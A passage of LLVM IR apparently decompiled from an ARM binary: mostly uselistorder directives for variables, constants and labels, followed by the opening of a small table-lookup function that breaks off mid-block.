  uselistorder i32 %v5_ffc0, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_ffac, { 1, 0, 2 }
  uselistorder i32 %v3_ffa8, { 1, 0, 2 }
  uselistorder i32 %v0_10968, { 1, 0, 2 }
  uselistorder i32 %v0_ff78, { 1, 0, 2 }
  uselistorder i1 %v7_ff58, { 1, 0 }
  uselistorder i1 %v7_ff30, { 1, 0 }
  uselistorder i32 %v0_fea8, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v3_fe88, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_fe7c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_fe08, { 2, 1, 0 }
  uselistorder i32 %v3_fe04, { 1, 0 }
  uselistorder i1 %v7_fdec, { 1, 0 }
  uselistorder i32 %v3_fde8, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_fddc, { 1, 0 }
  uselistorder i32 %v1_fdc0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_fdac, { 2, 1, 0 }
  uselistorder i32 %v3_fda8, { 1, 0 }
  uselistorder i32 %v0_fdac, { 1, 0 }
  uselistorder i32 %v2_103f8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fef4, { 4, 8, 5, 6, 3, 2, 7, 9, 10, 1, 0 }
  uselistorder i32 %v2_107fc, { 1, 2, 0 }
  uselistorder i32 %v2_1004c, { 0, 2, 1 }
  uselistorder i32* %v2_ffa4, { 1, 0, 2 }
  uselistorder i32 %v2_fdfc, { 0, 3, 1, 2 }
  uselistorder i32 %v2_fd40, { 1, 0 }
  uselistorder i32 %v1_fd40, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_fd40, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_fd10, { 2, 1, 0 }
  uselistorder i32 %v1_fd0c, { 1, 0 }
  uselistorder i32 %v2_fcdc, { 1, 0 }
  uselistorder i32 %v0_fcdc, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_fcd4, { 1, 0 }
  uselistorder i32 %v3_fcbc, { 3, 5, 2, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_fc8c, { 0, 3, 1, 2 }
  uselistorder i1 %v2_fc8c, { 1, 2, 0 }
  uselistorder i32 %v2_fc84, { 0, 3, 4, 5, 2, 1 }
  uselistorder i8 %stack_var_-1876.2, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %stack_var_-1880.2, { 3, 5, 4, 2, 1, 0 }
  uselistorder i8* %stack_var_-1884.2, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %stack_var_-1872.3, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %stack_var_-1868.1, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 %v0_fc7c, { 1, 0 }
  uselistorder i32 %v1_fc60, { 0, 2, 1, 3, 4, 5 }
  uselistorder i8 %stack_var_-1876.1, { 1, 0 }
  uselistorder i32 %stack_var_-1880.1, { 1, 0 }
  uselistorder i8* %stack_var_-1884.1, { 1, 0 }
  uselistorder i32 %stack_var_-1872.2, { 1, 0 }
  uselistorder i32 %stack_var_-1868.0, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_fc54, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fc54, { 0, 2, 1 }
  uselistorder i32 %v1_fc44, { 1, 0 }
  uselistorder i32 %v3_fc2c, { 1, 0, 2 }
  uselistorder i32 %storemerge258, { 1, 0, 2 }
  uselistorder i32 %v3_fba8, { 1, 0 }
  uselistorder i32 %v1_fb94, { 1, 0 }
  uselistorder i32 %v1_fb7c, { 1, 2, 0 }
  uselistorder i32 %v0_fb88, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fb4c, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_fb40, { 2, 1, 0 }
  uselistorder i32 %v1_fb1c, { 3, 1, 0, 4, 2 }
  uselistorder i1 %v2_faf4, { 1, 0 }
  uselistorder i32 %v4_fa94, { 2, 3, 7, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_fa10, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f9fc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_f91c, { 1, 0 }
  uselistorder i32 %v1_f918, { 2, 0, 1 }
  uselistorder i32 %v4_f8f4, { 1, 0 }
  uselistorder i1 %v2_f844, { 1, 0 }
  uselistorder i1 %v2_f830, { 1, 0 }
  uselistorder i1 %v2_f81c, { 1, 0 }
  uselistorder i32 %.397, { 3, 2, 1, 0 }
  uselistorder i1 %v7_f7f8, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_f7e0, { 1, 0 }
  uselistorder i1 %v3_f7c4, { 1, 0, 2 }
  uselistorder i1 %v2_f7b0, { 1, 0 }
  uselistorder i1 %v2_f78c, { 1, 0 }
  uselistorder i32 %v1_f73c, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f728, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f724, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v4_f714, { 1, 0 }
  uselistorder i32 %v0_f704, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f6f4, { 1, 0 }
  uselistorder i8 %stack_var_-1876.0, { 1, 0 }
  uselistorder i32 %v0_fa88, { 5, 2, 3, 6, 0, 1, 4, 7 }
  uselistorder i8* %stack_var_-1884.0, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-1872.0, { 0, 3, 2, 1 }
  uselistorder i32 %v4_f5a8, { 1, 0 }
  uselistorder i32 %v0_f598, { 2, 0, 1, 3 }
  uselistorder i32 %v3_f568, { 1, 0 }
  uselistorder i32 %v4_f554, { 2, 0, 1 }
  uselistorder i32 %v0_f53c, { 0, 2, 1 }
  uselistorder i32 %v0_f4e4, { 3, 2, 0, 1 }
  uselistorder i1 %v7_f488, { 1, 0 }
  uselistorder i32 %v3_f480, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f468, { 0, 2, 1 }
  uselistorder i32 %v0_f450, { 2, 1, 0 }
  uselistorder i32 %v0_f42c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge266, { 1, 0 }
  uselistorder i32 %v0_f3c4, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 1, 2, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 4, 3, 5, 6, 2, 7, 0, 8, 9 }
  uselistorder i32* %stack_var_-56, { 0, 9, 10, 3, 11, 6, 12, 5, 13, 7, 14, 8, 15, 4, 16, 17, 1, 2, 18, 19 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32 %tmp276, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 2, 0, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 65, 12, 13, 14, 15, 16, 17, 18, 19, 20, 66, 47, 67, 68, 69, 70, 71, 21, 22, 37, 48, 49, 50, 51, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 23, 24, 104, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 60, 61, 62, 44, 45, 46, 52, 53, 54, 55, 56, 57, 58, 59, 72, 73, 74, 75, 76, 77, 63, 64, 78, 79, 81, 80, 82, 83, 84, 85, 86, 88, 90, 89, 87, 91, 92, 93, 94, 100, 95, 96, 97, 98, 101, 151, 152, 102, 153, 154, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 103, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 136, 135, 138, 137, 99, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150 }
  uselistorder i32* %r2.global-to-local, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 37, 47, 33, 38, 0, 1, 2, 3, 5, 4, 6, 8, 7, 18, 19, 20, 21, 22, 23, 25, 26, 27, 29, 28, 30, 31, 32, 34, 36, 35, 42, 44, 43, 39, 40, 41, 48, 49, 50, 51, 52, 53, 54, 45, 46, 55, 56, 57, 58, 59, 61, 63, 62, 122, 60, 64, 65, 66, 67, 68, 72, 69, 70, 71, 73, 74, 76, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 94, 95, 92, 93, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121 }
  uselistorder i32* %r1.global-to-local, { 48, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 49, 41, 42, 21, 22, 37, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 103, 104, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 43, 44, 0, 50, 51, 52, 45, 46, 47, 102, 53, 54, 55, 57, 58, 56, 59, 60, 62, 61, 101, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100 }
  uselistorder i32* %r0.global-to-local, { 31, 30, 33, 32, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 46, 45, 48, 47, 50, 49, 51, 52, 123, 124, 125, 141, 140, 54, 142, 117, 119, 118, 143, 145, 144, 53, 56, 55, 57, 99, 98, 101, 100, 102, 103, 120, 1, 0, 2, 4, 3, 6, 5, 7, 8, 9, 10, 12, 11, 14, 13, 16, 15, 17, 18, 19, 20, 22, 21, 24, 23, 26, 25, 27, 28, 29, 126, 59, 58, 61, 60, 63, 62, 64, 66, 65, 67, 69, 68, 70, 72, 71, 73, 74, 75, 76, 77, 78, 80, 79, 82, 81, 84, 83, 85, 86, 87, 89, 88, 90, 92, 91, 94, 93, 95, 96, 97, 105, 104, 107, 106, 111, 108, 109, 110, 128, 127, 130, 129, 113, 112, 114, 115, 116, 122, 121, 149, 146, 147, 132, 131, 133, 135, 134, 137, 136, 138, 139, 215, 214, 148, 151, 150, 152, 153, 155, 154, 156, 159, 157, 158, 160, 162, 166, 161, 165, 163, 164, 170, 168, 169, 172, 171, 173, 175, 174, 167, 176, 177, 178, 180, 179, 181, 182, 184, 183, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 201, 204, 203, 205, 209, 208, 206, 207, 210, 211, 212, 213 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 14, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 20, 21, 6, 22, 7, 14, 0, 2, 1, 4, 3, 5, 18, 8, 9, 10, 11, 12, 13, 17, 19, 15, 16, 23, 24, 25, 26, 27, 28, 46, 31, 29, 30, 32, 49, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48 }
  uselistorder i1* %cpsr_z.global-to-local, { 27, 112, 220, 219, 98, 102, 103, 104, 105, 106, 28, 29, 56, 57, 58, 75, 76, 77, 78, 79, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 94, 30, 31, 32, 136, 34, 35, 36, 37, 38, 39, 44, 45, 40, 41, 42, 43, 46, 47, 48, 53, 54, 49, 50, 51, 52, 55, 59, 60, 64, 65, 61, 62, 63, 66, 96, 67, 72, 73, 68, 69, 70, 71, 74, 95, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 213, 107, 108, 109, 110, 111, 221, 97, 33, 99, 100, 101, 113, 115, 114, 116, 117, 119, 121, 120, 222, 118, 122, 123, 124, 125, 126, 127, 132, 128, 129, 130, 131, 214, 215, 216, 217, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 154, 153, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 135, 178, 179, 134, 180, 181, 133, 182, 183, 184, 185, 186, 187, 208, 188, 189, 190, 191, 192, 207, 193, 194, 195, 206, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 209, 210, 211, 218, 212 }
  uselistorder i1* %cpsr_c.global-to-local, { 27, 28, 29, 111, 221, 220, 97, 101, 102, 103, 104, 105, 30, 58, 59, 60, 77, 78, 79, 80, 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 15, 16, 11, 12, 13, 14, 17, 18, 19, 24, 25, 20, 21, 22, 23, 26, 93, 31, 32, 33, 34, 134, 35, 36, 37, 38, 39, 40, 41, 46, 47, 42, 43, 44, 45, 48, 49, 50, 55, 56, 51, 52, 53, 54, 57, 61, 62, 66, 67, 63, 64, 65, 68, 95, 69, 74, 75, 70, 71, 72, 73, 76, 94, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 213, 106, 107, 108, 109, 110, 214, 96, 133, 98, 99, 100, 112, 114, 113, 115, 116, 118, 120, 119, 222, 117, 121, 122, 123, 124, 125, 130, 126, 127, 128, 129, 215, 216, 217, 135, 218, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 132, 173, 174, 131, 175, 176, 206, 177, 178, 179, 180, 181, 182, 205, 183, 184, 185, 186, 187, 204, 188, 189, 190, 203, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 207, 208, 209, 210, 211, 219, 212 }
  uselistorder i32 (i32)* @function_ebdc, { 1, 0 }
  uselistorder i8 31, { 8, 2, 3, 9, 10, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 (i32)* @function_121ec, { 2, 1, 0, 3 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_14380.83 to i32), { 1, 2, 0, 3 }
  uselistorder [22 x i8]* @global_var_14368.79, { 1, 0 }
  uselistorder i32* @fp, { 2, 3, 4, 5, 6, 49, 50, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 33, 34, 35, 36, 1, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 53, 54, 55, 56 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), { 2, 4, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_1441c.205, { 1, 0 }
  uselistorder i8 58, { 4, 6, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 62, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 37, { 3, 5, 4, 2, 1, 0 }
  uselistorder i8 34, { 4, 6, 5, 3, 2, 1, 0 }
  uselistorder i8 36, { 7, 8, 11, 12, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 8, 9, 12, 13, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_12350, { 6, 7, 8, 9, 10, 11, 12, 19, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 21, 22, 20, 27, 23, 24, 25, 26, 28, 29, 30, 31 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 1073741824, { 1, 0 }
  uselistorder i32 (i32)* @function_10b68, { 35, 26, 25, 30, 38, 37, 36, 34, 33, 32, 31, 29, 28, 27, 24, 23, 6, 22, 21, 20, 39, 3, 2, 1, 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_112b0, { 2, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_10b3c, { 3, 9, 0, 1, 2, 4, 5, 6, 7, 8, 10, 11, 32, 12, 13, 14, 15, 36, 37, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 35 }
  uselistorder i32 (i32)* @function_10c20, { 22, 30, 29, 28, 27, 26, 25, 24, 23, 21, 20, 5, 19, 18, 17, 16, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2 }
  uselistorder i8* bitcast (i8** @global_var_1cad0.136 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1cad1.137, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1cad0.136 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_11d10, { 2, 0, 1 }
  uselistorder i32 284, { 3, 4, 5, 0, 1, 2, 6, 7 }
  uselistorder i32 1544, { 1, 0 }
  uselistorder i32 1672, { 2, 0, 1 }
  uselistorder i32 ()* @function_f144, { 3, 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_1237c, { 0, 1, 2, 7, 3, 4, 5, 6, 9, 8 }
  uselistorder i32 16384, { 33, 56, 34, 57, 35, 58, 36, 59, 37, 60, 38, 61, 13, 62, 12, 69, 0, 50, 1, 51, 2, 52, 3, 53, 4, 54, 5, 55, 6, 63, 7, 64, 8, 65, 9, 66, 31, 67, 32, 68, 29, 71, 30, 72, 28, 70, 39, 73, 10, 74, 11, 75, 14, 83, 40, 84, 16, 76, 43, 77, 42, 78, 44, 79, 45, 80, 15, 81, 41, 82, 17, 85, 18, 86, 20, 87, 19, 88, 22, 89, 21, 90, 23, 91, 24, 92, 25, 93, 26, 94, 27, 95, 46, 47, 48, 49 }
  uselistorder i32 (i32, i32, i32, i32)* @function_d114, { 9, 8, 7, 2, 6, 5, 4, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_11944, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_d0b8, { 11, 10, 9, 3, 8, 7, 6, 5, 4, 1, 0, 2 }
  uselistorder i8* @global_var_1cab4.194, { 2, 1, 0 }
  uselistorder i32 16711680, { 3, 0, 1, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_143fc.188 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_143f4.186 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_143b8.174 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_f218, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14424.166 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14420.164 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8* @global_var_1cac5.160, { 1, 0 }
  uselistorder i8 64, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1cab8.151 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8* @global_var_1cac4.152, { 1, 0 }
  uselistorder i8** @global_var_1caa4.147, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1caa4.147 to i32), { 0, 2, 1, 9, 8, 3, 7, 6, 5, 4 }
  uselistorder i32 1024, { 1, 0 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 65280, { 35, 1, 18, 0, 2, 3, 36, 19, 4, 37, 25, 20, 21, 26, 27, 28, 38, 39, 40, 5, 41, 6, 7, 29, 30, 31, 42, 43, 44, 8, 45, 9, 10, 46, 11, 47, 32, 33, 48, 12, 49, 50, 22, 51, 52, 13, 53, 54, 23, 55, 56, 14, 57, 24, 34, 58, 59, 15, 60, 61, 16, 17 }
  uselistorder i32 ()* @function_e978, { 74, 73, 72, 71, 70, 69, 68, 64, 67, 66, 65, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 16, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 6, 5, 4, 3, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_123b0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 2048, { 7, 6, 4, 9, 10, 0, 1, 2, 8, 11, 3, 12, 13, 5, 14 }
  uselistorder i32* @global_var_1cb3c.145, { 1, 5, 2, 3, 4, 0 }
  uselistorder i32* @global_var_1cb38.143, { 1, 2, 3, 4, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1cad4.130, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32)* @function_e9d0, { 1, 0 }
  uselistorder i32* @global_var_1cb1c.49, { 4, 5, 1, 2, 3, 6, 7, 8, 9, 10, 0, 11, 15, 12, 13, 14 }
  uselistorder i32 ()* @function_114a4, { 2, 1, 0 }
  uselistorder i32 ()* @function_11b1c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 7, 85, 86, 87, 8, 0, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 88, 89, 90, 91, 41, 42, 43, 44, 45, 46 }
  uselistorder i32* @sb, { 3, 4, 7, 1, 2, 5, 6, 11, 10, 8, 9, 12, 13, 84, 85, 86, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 87, 88, 89, 90, 91, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder label %dec_label_pc_10b2c, { 1, 0 }
  uselistorder label %dec_label_pc_10b24, { 1, 0 }
  uselistorder label %dec_label_pc_10a80, { 1, 0 }
  uselistorder label %dec_label_pc_ff84.backedge.thread500, { 9, 2, 8, 4, 7, 3, 6, 1, 5, 0 }
  uselistorder label %dec_label_pc_ff84.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_109a4, { 1, 0 }
  uselistorder label %bb393, { 1, 0 }
  uselistorder label %dec_label_pc_10900, { 1, 0 }
  uselistorder label %thread-pre-split96, { 1, 0 }
  uselistorder label %dec_label_pc_10844, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10778, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10764, { 1, 0 }
  uselistorder label %dec_label_pc_106c4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_106b0, { 1, 0 }
  uselistorder label %dec_label_pc_10610, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_105fc, { 1, 0 }
  uselistorder label %dec_label_pc_105a4, { 4, 5, 1, 2, 3, 11, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_10588, { 2, 1, 0 }
  uselistorder label %dec_label_pc_103d8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_103c4, { 1, 0 }
  uselistorder label %dec_label_pc_102ac, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10298, { 1, 0 }
  uselistorder label %dec_label_pc_1020c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_101f8, { 1, 0 }
  uselistorder label %dec_label_pc_10188, { 1, 0 }
  uselistorder label %dec_label_pc_1016c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10158, { 1, 0 }
  uselistorder label %dec_label_pc_10114, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_10104, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb366, { 2, 1, 0 }
  uselistorder label %bb363, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10064, { 1, 0 }
  uselistorder label %dec_label_pc_10064.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ffec, { 1, 0 }
  uselistorder label %bb360, { 1, 0 }
  uselistorder label %dec_label_pc_ff9c, { 1, 0 }
  uselistorder label %dec_label_pc_ff8c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ff8c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ff80.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_fee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fdbc, { 1, 7, 8, 4, 5, 0, 6, 2, 3 }
  uselistorder label %dec_label_pc_fd98, { 1, 0 }
  uselistorder label %bb355, { 1, 0 }
  uselistorder label %dec_label_pc_fcbc, { 1, 0 }
  uselistorder label %dec_label_pc_fcb4, { 1, 0 }
  uselistorder label %bb353, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fbbc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_fb7c, { 1, 0 }
  uselistorder label %dec_label_pc_fa1c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_fa10, { 1, 0 }
  uselistorder label %.thread65, { 2, 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_f87c, { 1, 0 }
  uselistorder label %dec_label_pc_f870, { 1, 0 }
  uselistorder label %dec_label_pc_f864, { 1, 0 }
  uselistorder label %dec_label_pc_f858, { 1, 0 }
  uselistorder label %dec_label_pc_f84c, { 1, 0 }
  uselistorder label %dec_label_pc_f838, { 1, 0 }
  uselistorder label %dec_label_pc_f824, { 1, 0 }
  uselistorder label %dec_label_pc_f810, { 1, 0 }
  uselistorder label %dec_label_pc_f7f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f7cc, { 1, 0 }
  uselistorder label %dec_label_pc_f7c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f79c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f778, { 1, 0 }
  uselistorder label %bb316, { 1, 0 }
  uselistorder label %dec_label_pc_f724, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_f4e4, { 1, 0 }
}

define i32 @function_10b3c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10b3c:
  %v3_10b40 = mul i32 %arg1, 8
  %v2_10b44 = add i32 %v3_10b40, ptrtoint (i32* @global_var_1cb48.213 to i32)
  %v2_10b48 = icmp eq i32* %arg2, null
  br i1 %v2_10b48, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10b3c
  %v3_10b5411 = inttoptr i32 %v2_10b44 to i32*
  %v4_10b5412 = load i32, i32* %v3_10b5411, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_10b3c
  %v2_10b4c = add i32 %v3_10b40, add (i32 ptrtoint (i32* @global_var_1cb48.213 to i32), i32 5)
  %v3_10b4c = inttoptr i32 %v2_10b4c to i8*
